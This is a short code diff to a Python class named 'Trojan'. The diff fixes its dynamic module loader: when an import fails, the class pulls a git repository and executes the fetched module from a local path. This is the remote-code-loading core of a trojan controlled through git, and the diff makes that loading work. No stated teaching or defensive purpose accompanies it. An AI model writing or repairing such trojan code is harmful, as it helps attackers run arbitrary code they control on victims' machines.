@@ -36,11 +36,12 @@ class Trojan:
                     self.import_module(word.capitalize())
 
     def import_module(self, module_name):
+        module_path = os.path.join(self.local_dir, f"{module_name.lower()}.py")
         try:
             module = importlib.import_module(module_name)
         except ImportError:
             self.pull_git_repo()
-            spec = importlib.util.spec_from_file_location(module_name)
+            spec = importlib.util.spec_from_file_location(module_name, module_path)
             module = importlib.util.module_from_spec(spec)
             spec.loader.exec_module(module)
         self.run_module(module)
